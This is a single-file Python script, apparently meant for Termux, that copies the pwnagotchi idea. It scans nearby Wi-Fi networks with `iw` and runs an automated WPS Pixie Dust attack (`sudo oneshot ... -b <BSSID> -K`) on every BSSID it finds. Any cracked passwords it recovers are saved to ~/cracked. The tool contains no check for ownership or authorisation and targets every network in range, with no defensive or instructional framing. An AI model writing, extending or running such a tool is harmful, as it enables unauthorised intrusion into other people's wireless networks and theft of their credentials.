#!/usr/bin/env python3
"""
pwnagotchi-like Termux app with simple text-based logging
Uses `iw dev <interface> scan` and `oneshot -b` non-interactively.
All code in one file. Python 3.9+
Features:
  - Background Wi-Fi scanning via `iw`
  - Per-BSSID Pixie Dust attacks: `sudo oneshot -i wlan0 -b <BSSID> -K`
  - Text-based output: logs each cycle with counters and a simple emoticon
  - Re-scans every 5s when idle
  - Saves each cracked PSK in ~/cracked
"""
import os
import sys
import subprocess
import time
import re
from datetime import datetime

# Configuration
INTERFACE = os.environ.get('WIFI_INTERFACE', 'wlan0')
CRACKED_DIR = os.path.expanduser('~/cracked')
SCAN_INTERVAL = 5  # seconds between full cycles
ATTACK_TIMEOUT = 10  # seconds per BSSID attack
ONESHOT_CMD = 'oneshot'

os.makedirs(CRACKED_DIR, exist_ok=True)

# Scan for BSSIDs using iw
def scan_networks(interface):
    try:
        proc = subprocess.run(
            ['iw', 'dev', interface, 'scan'], capture_output=True, text=True, check=True
        )
        output = proc.stdout
    except subprocess.CalledProcessError:
        return []
    bssids = []
    for line in output.splitlines():
        line = line.strip()
        if line.startswith('BSS '):
            parts = line.split()
            if len(parts) >= 2:
                bssids.append(parts[1])
    return list(dict.fromkeys(bssids))

# Attack a single BSSID
def attack_bssid(bssid):
    try:
        proc = subprocess.run(
            ['sudo', ONESHOT_CMD, '-i', INTERFACE, '-b', bssid, '-K'],
            capture_output=True, text=True, timeout=ATTACK_TIMEOUT
        )
        return proc.stdout + proc.stderr
    except subprocess.TimeoutExpired:
        return ''
    except Exception:
        return ''

# Parse PSKs from output
def parse_psks(output):
    return re.findall(r'PSK:\s*(\S+)', output)

# Save cracked credentials
def save_crack(bssid, psk):
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"{ts}_{bssid.replace(':','')}.txt"
    path = os.path.join(CRACKED_DIR, filename)
    with open(path, 'w') as f:
        f.write(f"BSSID: {bssid}\nPSK: {psk}\n")

# Main loop
def main():
    if os.geteuid() != 0:
        print("[!] Please run as root (tsu)")
        sys.exit(1)

    cycle = 0
    total_scanned = 0
    total_cracked = 0

    print("[+] Pwnagotchi-Termux text mode starting...")
    print(f"[+] Interface: {INTERFACE}, Scan interval: {SCAN_INTERVAL}s\n")

    while True:
        cycle += 1
        start_time = datetime.now().strftime('%H:%M:%S')

        bssids = scan_networks(INTERFACE)
        scanned_now = len(bssids)
        total_scanned += scanned_now

        cracked_now = 0
        for bssid in bssids:
            out = attack_bssid(bssid)
            psks = parse_psks(out)
            if psks:
                cracked_now += len(psks)
                for psk in psks:
                    save_crack(bssid, psk)

        total_cracked += cracked_now
        state_icon = '^_^' if cracked_now else '-_-'  # simple emoticon

        # Log cycle result
        print(f"[{start_time}] Cycle {cycle}: Scanned {scanned_now} nets, Cracked {cracked_now} | Totals => Scanned: {total_scanned}, Cracked: {total_cracked} {state_icon}")

        time.sleep(SCAN_INTERVAL)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exiting... Goodbye!")
